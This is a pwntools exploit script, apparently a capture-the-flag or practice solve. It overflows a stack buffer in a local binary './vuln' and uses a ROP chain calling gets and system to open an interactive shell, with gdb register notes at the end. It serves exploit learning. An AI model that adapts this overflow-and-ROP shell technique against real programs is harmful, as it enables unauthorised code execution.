from pwn import *

# context.terminal = ["tmux", "-h"]

elf = ELF("./vuln")
rop = ROP(elf)
# io = process("./vuln")
io = gdb.debug("./vuln", "start")

payload = b"a" * 72
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.system)
# \x00\x00\x00\x00\x64\x63\x62\x61
# \x00\x00\x00\x00\x64\x63\x62\x61
# \x00\x00\x00\x01
# \x61\x61\x61\x60
io.sendline(payload)
io.sendline(b"abcdefghijklmnopqrstuvwxyz")
io.sendline(b"sh;") # NG
io.sendline(b"sh;\x00") # OK
io.sendline(b"sh;\x00\x00\x00\x00\x00") # OK
io.sendline(b"/bin0sh\x00")
# io.sendline(b"sh;\x01\x10\x01\x01\x01\x01")
io.interactive()

### gets * 1
# rax: 0
# rdi: 0x7ffcb9bb0530
# ↓
# rax: 0x7ffcb9bb0530
# rdi: 0x7fbc1e580a80
# ↓
# RAX: 0x0 
# RDI: 0x7fbc1e580a80 --> 0x0 
# ↓
# RAX: 0x7fbc1e580a80 --> 0x0 
# RDI: 0x7fbc1e580a80 --> 0x0 